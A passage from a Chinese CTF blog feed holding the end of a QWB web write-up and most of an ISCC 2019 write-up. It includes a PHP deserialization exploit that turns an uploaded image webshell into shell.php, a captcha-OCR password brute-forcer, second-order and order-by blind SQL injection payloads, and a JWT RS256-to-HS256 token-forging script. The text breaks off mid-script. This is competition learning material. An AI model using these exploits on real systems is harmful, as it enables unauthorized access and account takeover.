</figure><p>太完美了，又是可以通过反序列化进行控制的变量</p><p>那么，最终得到思路如下：</p><ul><li>通过cookie反序列化为<strong>Register</strong>类的<strong>$checker</strong>赋值为<strong>Profile</strong>类，触发魔术方法<code>__destruct</code>后<strong>Profile</strong>类中的<strong>index</strong>方法</li><li><strong>Profile</strong>类中没有<strong>index</strong>方法，触发魔术方法<strong>__call</strong>，调用<strong>Profile</strong>类中的<strong>upload_img</strong>方法</li><li>将png图片马修改为php文件马</li></ul><p>这样就形成了一条完整的<strong>攻击链</strong></p><p>接下来就是编写EXP，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($checker)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = $checker;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;   <span class="comment"># 先上传一个图片马shell.png，保存路径为/upload/md5($_SERVER['REMOTE_ADDR'])/md5($_FILES['upload_file']['name']).".png"</span></span><br><span class="line">    <span class="keyword">public</span> $filename_tmp = <span class="string">'./upload/3b1412753f475cc969c37231dd6eaea2/93bc3c03503d8768cf7cc1e39ce16fcb.png'</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">'./upload/3b1412753f475cc969c37231dd6eaea2/shell.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $ext = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">public</span> $except = <span class="keyword">array</span>(<span class="string">'index'</span> =&gt; <span class="string">'upload_img'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$register = <span class="keyword">new</span> Register(<span class="keyword">new</span> Profile());</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($register)));</span><br></pre></td></tr></table></figure><p>这里注意需要设置<strong>命名空间</strong> app\web\controller（要不然反序列化会出错，不知道对象实例化的是哪个类） </p><p>我们将前面上传的图片马路径记下，运行EXP后得到base64加密后的序列化字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo0OntzOjEyOiJmaWxlbmFtZV90bXAiO3M6Nzg6Ii4vdXBsb2FkLzNiMTQxMjc1M2Y0NzVjYzk2OWMzNzIzMWRkNmVhZWEyLzkzYmMzYzAzNTAzZDg3NjhjZjdjYzFlMzljZTE2ZmNiLnBuZyI7czo4OiJmaWxlbmFtZSI7czo1MToiLi91cGxvYWQvM2IxNDEyNzUzZjQ3NWNjOTY5YzM3MjMxZGQ2ZWFlYTIvc2hlbGwucGhwIjtzOjM6ImV4dCI7YjoxO3M6NjoiZXhjZXB0IjthOjE6e3M6NToiaW5kZXgiO3M6MTA6InVwbG9hZF9pbWciO319czo4OiJyZWdpc3RlZCI7YjowO30%3D</span><br></pre></td></tr></table></figure><p>然后重新登陆时置cookie的<strong>user</strong>属性值</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\28.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后我们此时就可以发现，此时能成功访问到shell了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\29.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\30.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再重新上传个shell拿flag就行了</p><p>最后附上代码思路整理图：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\QWB\31.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      ctf
    
    </summary>
    
      <category term="ctf" scheme="https://Foxgrin.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ISCC 2019 Writeup</title>
    <link href="https://Foxgrin.github.io//posts/59602/"/>
    <id>https://Foxgrin.github.io//posts/59602/</id>
    <published>2019-05-25T04:15:00.000Z</published>
    <updated>2019-05-25T05:14:05.776Z</updated>
    
    <content type="html"><![CDATA[<p>这个比赛虽然总体难度不大，但是不得不感叹河南大军恐怖如斯，不准点做题拿个百血真不容易，垂直上分的大佬频繁出现，说这个比赛是一年一度的py大赛还是有点道理的（滑稽）。但是不得不说，参加这比赛还是学到蛮多套路的，脑洞大开，以及让人摸不着头的flag提交格式emmm<a id="more"></a></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019\29.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>首先要求输入的<strong>value</strong>的<strong>ascii</strong>码不在可见范围之内，但是最后要求value经过chr拼接后的username为’w3lc0me_To_ISCC2019’</p><p>php的chr函数会自动进行<strong>mod256</strong>，所以使用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"w3lc0me_To_ISCC2019"</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">s1 = <span class="string">"&amp;value[]="</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line"></span><br><span class="line">    value = ord(i) + <span class="number">256</span></span><br><span class="line"></span><br><span class="line">    payload = payload + s1 + str(value)</span><br><span class="line"></span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:value[]=375&amp;value[]=307&amp;value[]=364&amp;value[]=355&amp;value[]=304&amp;value[]=365&amp;value[]=357&amp;value[]=351&amp;value[]=340&amp;value[]=367&amp;value[]=351&amp;value[]=329&amp;value[]=339&amp;value[]=323&amp;value[]=323&amp;value[]=306&amp;value[]=304&amp;value[]=305&amp;value[]=313</span><br></pre></td></tr></table></figure><p>再来就是要绕过<code>intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333</code></p><p>intval函数处理字符串时，会从头开始检测到除数字以外的字母为止</p><p>我们注意到<strong>intval($password + 1) &gt; 2333</strong></p><p>是先将$password + 1后再经过intval函数的处理，如果$password传入的是十六进制数，例如0x10，那么intval(‘0x10’)结果为0，intval(‘0x10’ + 1)结果为17，这个特性在<strong>7.0以上版本不适用</strong></p><p>所以只需要把2333转换成16进制即可</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019\17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p><strong>payload:password=0x91d</strong></p><p>所以最后的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?value[]=375&amp;value[]=307&amp;value[]=364&amp;value[]=355&amp;value[]=304&amp;value[]=365&amp;value[]=357&amp;value[]=351&amp;value[]=340&amp;value[]=367&amp;value[]=351&amp;value[]=329&amp;value[]=339&amp;value[]=323&amp;value[]=323&amp;value[]=306&amp;value[]=304&amp;value[]=305&amp;value[]=313&amp;password=0x91d</span><br></pre></td></tr></table></figure><p>flag：<code>flag{8311873e241ccad54463eaa5d4efc1e9}</code></p><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>爆破三位数字密码，有图片验证码，需要借助python的pytesseract和Image库来识别图片验证码 </p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">image_url = <span class="string">"http://39.100.83.188:8002/vcode.php"</span></span><br><span class="line">pass_url = <span class="string">'http://39.100.83.188:8002/login.php'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">password = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getImageCode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        print(<span class="string">'--------------------开始识别验证码'</span>)</span><br><span class="line">        imageURL = image_url</span><br><span class="line">        image = s.get(url=imageURL)</span><br><span class="line">        captcha_img = Image.open(BytesIO(image.content))</span><br><span class="line">        imageCode = pytesseract.image_to_string(captcha_img)</span><br><span class="line">        print(<span class="string">'验证码识别结果:'</span>,imageCode)</span><br><span class="line">        print(<span class="string">'--------------------开始校验验证码'</span>)</span><br><span class="line">        match = re.search(<span class="string">r'^[a-z | 0-9]&#123;4&#125;$'</span>,imageCode)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> match:</span><br><span class="line">            print(<span class="string">'验证码:'</span>,imageCode,<span class="string">'校验结果识别失败，继续识别'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'验证码:'</span>,imageCode,<span class="string">'校验成功'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> imageCode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span><span class="params">(password)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        passwd = <span class="string">""</span></span><br><span class="line">        <span class="keyword">if</span> len(str(password)) != <span class="number">3</span>:</span><br><span class="line">            count = <span class="number">3</span> - len(str(password))</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,count+<span class="number">1</span>):</span><br><span class="line">                passwd = passwd + <span class="string">"0"</span></span><br><span class="line">        passwd = passwd + str(password)</span><br><span class="line">        print(<span class="string">'--------------------------------------开始猜测密码'</span>)</span><br><span class="line">        imageCode = getImageCode()</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">'admin'</span>,</span><br><span class="line">            <span class="string">'pwd'</span>:passwd,</span><br><span class="line">            <span class="string">'user_code'</span>:imageCode</span><br><span class="line">            &#125;</span><br><span class="line">        g = s.post(url=pass_url,data=data)</span><br><span class="line">        g.encoding = g.apparent_encoding</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'验证码错误'</span> <span class="keyword">in</span> g.text:</span><br><span class="line">            print(g.text)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'密码错误'</span> <span class="keyword">in</span> g.text:</span><br><span class="line">            print(<span class="string">'密码:'</span>,passwd,<span class="string">'错误'</span>)</span><br><span class="line">            password +=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            print(<span class="string">'密码:'</span>,passwd,<span class="string">'正确'</span>)</span><br><span class="line">            print(<span class="string">'返回的页面结果:'</span>)</span><br><span class="line">            print(g.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">guess(password)</span><br></pre></td></tr></table></figure><p>但是这题听说可以删掉cookie后直接绕过验证码，密码是<strong>996</strong></p><p>flag：<code>flag{996_ICU}</code></p><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>sql-labs 24关原题，考察<strong>二次注入</strong></p><p>注入点在login_create.php中的<strong>username</strong>字段，注册用户名为<strong>admin’#</strong></p><p>之后登录admin’#，username字段就赋值给了<strong>session</strong>中的username字段</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019\18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在password_change.php中的$username是直接从session中取出的，也就是取出的username为admin’#</p><p>拼接到sql语句中：</p><figure class="highlight plain"><figcaption><span>users SET PASSWORD</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&apos;123&apos; where username=&apos;admin&apos;#&apos; and password=&apos;$curr_pass&apos;</span><br></pre></td></tr></table></figure><p>用户的密码就被修改为123</p><p>但是坑的地方在于这题没有设置容器，所有人共用一个数据库，可能很多人同时一起修改了admin用户的密码，所以有时候修改admin的密码后登陆不成功，并且这个数据库会定时修改所有用户的密码</p><p>所以能稳定登陆admin的方法是持续发送修改密码的包，如果admin’#用户被注册，注册admin’########也是可以的</p><p>最终登陆成功页面：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019\19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure> <h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019\28.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>考察parse_str<strong>变量覆盖</strong></p><p>payload:<a href="http://39.100.83.188:8066/index.php?action=auth&amp;hashed_key=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b&amp;key=1" target="_blank" rel="noopener">http://39.100.83.188:8066/index.php?action=auth&amp;hashed_key=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b&amp;key=1</a></p><p>flag{7he_rea1_f1@g_15_4ere}</p><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>抓包发现是<code>python</code>写的网站，一开始有点慌，不过这题不是查考察python</p><p>我们登陆一个用户时抓包可以发现头部存在<strong>认证</strong>字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: iscc19 eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiaGh4NjY2IiwicHJpdiI6Im90aGVyIn0.vwB2Jj8TyGQhO6i0EEw6vCIrplCxrh23ZHQ15aWeeoQkYsd5tDSu3cixf-faEfQbLkB-_-6EF4DVxGbR5zGp4MyQn90KeRooOF65xQViZ8qRUVvylU5pJBDCcs-XEE-GdD6qfARNFpdg8toggC0ld5l5OJbeAA9au00xiaCxhzs</span><br></pre></td></tr></table></figure><p>很明显是这个网站采用了<strong>JWT身份验证</strong>，类似于Session机制，<strong>JWT</strong>的token结构是<strong>Json</strong>格式，同时将认证信息以经过<strong>加密算法</strong>处理后存储在头部的<code>Authorization</code>字段</p><p>根据题目页面的提示：只有<strong>admin</strong>身份才能查看flag，那么这题多半就是考察伪造<strong>admin</strong>身份的认证字段登陆</p><p>我们可以将我们注册用户的认证字段拉近<strong>JWT</strong>的<a href="https://jwt.io/" target="_blank" rel="noopener">生成网站</a>进行解密</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>解密后得到的字段正是<strong>JWT</strong>的token三个组成部分：</p><ul><li>Header：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;RS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>alg</code>为算法的缩写，说明这串<strong>认证字符</strong>是经过<strong>RS256</strong>加密的。<code>typ</code>为类型的缩写</p><ul><li>Payload：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;hhx666&quot;,</span><br><span class="line">  &quot;priv&quot;: &quot;other&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这些是用户的信息</p><ul><li>Signature：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64Encode(header) + &quot;.&quot; +</span><br><span class="line">  base64Encode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure><p>这部分就是加密算法所使用的<strong>密钥</strong></p><p>常见的加密算法有<strong>RS256</strong>和<strong>HS256</strong>，<strong>RS256</strong>是非对称加密，需要公钥和私钥才能对数据进行篡改，一般私钥我们是拿不到的，就像这题的认证字段正是经过<strong>RS256</strong>加密，而<strong>HS256</strong>则是对称加密，只需要公钥就可以进行伪造</p><p>在<a href="http://39.100.83.188:8053/static/js/common.js" target="_blank" rel="noopener">http://39.100.83.188:8053/static/js/common.js</a> 源码处我们可以看到<code>public key</code>存放目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function getpubkey()&#123;</span><br><span class="line">    /* </span><br><span class="line">    get the pubkey for test</span><br><span class="line">    /pubkey/&#123;md5(username+password)&#125;</span><br><span class="line">    */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>/pubkey</code>正是存放公钥的目录，它提示了我们公钥可以通过我们注册的用户名和密码的md5加密进行查看，我们访问<a href="http://39.100.83.188:8053/pubkey/7035124f823530ce2af7fb19bb625304" target="_blank" rel="noopener">http://39.100.83.188:8053/pubkey/7035124f823530ce2af7fb19bb625304</a> 可以看到此RS256加密算法采用的<strong>公钥</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;pubkey&quot;:&quot;-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\nIC+LX+9V/mpyKe9R3wIDAQAB\n-----END PUBLIC KEY-----&quot;,&quot;result&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>因为私钥无法获取到，所以这时我们就需要将算法修改为<strong>HS256</strong>,如果将算法从RS256更改为HS256，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。 </p><p>生成认证字段的脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">public = open(<span class="string">'1.txt'</span>, <span class="string">'r'</span>).read()</span><br><span class="line"><span class="keyword">print</span> jwt.encode(&#123;<span class="string">"name"</span>: <span class="string">"iscc19"</span>,<span class="string">"priv"</span>: <span class="string">"admin"</span>&#125;, key=public, algorithm=<span class="string">'HS256'</span>)</span><br></pre></td></tr></table></figure><p>说明一下<code>1.txt</code>中存放的公钥为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK</span><br><span class="line">omh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h</span><br><span class="line">Kk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc</span><br><span class="line">IC+LX+9V/mpyKe9R3wIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>需要将网页上获得的公钥中<code>\n</code>替换成<strong>换行</strong>，并且这里<code>priv</code>之前是为<code>other</code>，需要修改为<code>admin</code>身份，用户名<code>name</code>猜测为之前认证字段的<code>iscc19</code></p><p>需要额外在python2环境下安装<code>jwt</code>模块：<code>pip install PyJWT</code></p><p>一开始运行可能会出现下面的报错：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>跟踪源库<code>algorithms.py</code>的源码，会发现<code>prepare_key</code>函数会检验非法字符，将检验过程去掉，再次运行</p><p>得到字符串：<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiaXNjYzE5IiwicHJpdiI6ImFkbWluIn0.bEza2gXi7_q9qPFTSgbu8wWRpmHqHd1FFa-rJKY_38c</code></p><p>然后将这串字符添加到头部的<code>Authorization</code>字段，附加上<code>iscc19</code>，访问<code>/list</code>，即可获得admin用户的<code>list</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>最后访问<a href="http://39.100.83.188:8053/text/admin:22f1e0aa7a31422ad63480aa27711277" target="_blank" rel="noopener">http://39.100.83.188:8053/text/admin:22f1e0aa7a31422ad63480aa27711277</a> </p><p>即可获得flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这题也是猜用户名<code>iscc19</code>稍微要有点脑洞的，emmm做的时候运气好直接拿这个用户名来试</p><p>参考文章：<a href="https://www.anquanke.com/post/id/145540" target="_blank" rel="noopener">Json Web Token历险记</a></p><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p>这题也是道脑洞题，一开始页面只给了信息：<strong>看来你并不是Union.373组织成员，请勿入内！ </strong></p><p>扫描后台也没有结果，无奈只能尝试各种<strong>HTTP头部修改</strong>的方法，最后发现是在<code>User-Agent</code>头部字段最后添加上：<code>Union.373</code></p><p>开始提示我们输入用户名和密码，通过POST方式传入参数<code>username</code>和<code>password</code>后，提示我们用户密码即为flag</p><p>在<code>password</code>字段加入<strong>单引号</strong>出现sql报错信息，很明显下面考察的是注出用户的<strong>密码</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>经过fuzz测试，过滤了<code>#</code>，<code>(</code>，<code>)</code>，<code>extractvalue</code>，<code>sleep</code>，<code>and</code>，<code>password</code>等关键参数，其中最致命的还是过滤了<code>()</code>，导致很多函数都无法使用</p><p>使用万能密码<code>1&#39; or &#39;1</code>登陆，发现了回显了<strong>用户名</strong>信息：<code>union_373_Tom</code></p><p>既然有回显，就尝试一下联合查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=union_373_Tom&amp;password=1&apos; union select 1,2,3 or &apos;</span><br></pre></td></tr></table></figure><p>回显了<code>2</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>但是这里因为过滤了<strong>括号</strong>，导致我们无法使用子查询</p><p>查阅了一波<strong>过滤了括号的注入方式</strong>：<a href="https://blog.csdn.net/nzjdsds/article/details/81879181" target="_blank" rel="noopener">https://blog.csdn.net/nzjdsds/article/details/81879181</a> </p><p>这篇文章里提到的使用<code>union order by</code>的方式进行<strong>排序盲注</strong>，思路简单而言就是通过<code>union</code>使查询结果为<code>union_373_Tom</code>和我们拼接上的一行查询结果通过<code>order by</code>对密码<code>password</code>字段进行排序，并根据回显的用户名信息来判断排序的结果</p><p>下面用本地测试的过程来进行思路的说明：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这是<code>users</code>表中的初始数据，下面我们通过<code>union</code>插入我们构造的查询结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="\img\ISCC2019/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到对第三列进行了<strong>排序</strong>，并且可以根据我们插入的不同密码字段排序结果也不同，在页面上回显的用户名信息也不同：</p><ul><li>union拼接的密码字段排序后比成员密码大，回显用户名：<code>union_373_Tom</code></li><li>union拼接的密码字段排序后比成员密码小或相等，回显union拼接的用户名字段</li></ul><p>另外因为题目password字段最后还需要闭合单引号，所以采用的是<code>order by 3,&#39;1</code>，mysql会先根据逗号前面的进行排序，如果数据相等，则使用逗号后的进行排序</p><p>所以最后使用的盲注payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=union_373_Tom&amp;password=1&apos; or &apos;1&apos; union select 1,&apos;hhx&apos;,&apos;1&apos; from admin order by 3,&apos;1</span><br></pre></td></tr></table></figure><p>我们知道<code>order by</code>是对字符串一位位的比较，所以思路就是对<code>union_373_Tom</code>的密码字段进行逐位的排序比较，根据回显的用户名，如果插入的密码字段大于用户名密码字段，则需要</p><p>最后需要弄清楚<code>order by</code>排序的原理，测试了好久，排序其实是根据字符<code>ascii</code>码的大小，另外mysql中大小写的字符的排序是相同的，测试后的字典序列为<code>_ZzYyXxWwVvUuTtSsRrQqPpOoNnMmLlKkJjIiHhGgFfEeDdCcBbAa9876543210</code></p><p>脚本代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://39.100.83.188:8054"</span></span><br><span class="line">headers 